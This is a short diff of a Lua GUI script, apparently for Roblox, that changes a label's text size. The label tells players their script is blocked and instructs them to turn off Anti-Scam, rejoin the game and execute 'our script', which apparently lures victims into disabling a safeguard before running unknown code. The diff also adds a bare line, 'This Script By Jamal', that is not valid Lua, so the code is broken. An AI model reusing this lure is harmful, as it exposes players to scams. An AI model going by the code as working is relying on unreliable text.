@@ -25,12 +25,13 @@ label.BackgroundTransparency = 1
 label.TextColor3 = Color3.fromRGB(255, 255, 255)
 label.TextWrapped = true
 label.Font = Enum.Font.SourceSans
-label.TextSize = 12
+label.TextSize = 15
 label.Text = [[🚫 Script is Blocked.
 Follow this instruction.
 1) Turn off Anti-Scam
 2) Rejoin the game
 3) Execute our script ]] 
+This Script By Jamal
 label.Parent = frame
 
 -- Create Rejoin Button
